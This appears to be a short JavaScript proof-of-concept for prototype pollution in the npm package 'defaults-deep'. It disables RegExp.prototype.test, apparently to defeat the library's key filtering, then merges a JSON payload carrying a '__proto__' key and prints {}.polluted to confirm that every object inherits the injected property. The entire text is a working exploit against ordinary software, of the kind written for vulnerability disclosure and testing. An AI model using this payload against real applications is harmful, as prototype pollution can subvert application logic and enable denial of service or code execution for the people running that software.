RegExp.prototype.test = () => false;
const defaultsDeep = require('defaults-deep');
console.log({}.polluted);
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
defaultsDeep({}, JSON.parse(malicious_payload));
console.log({}.polluted);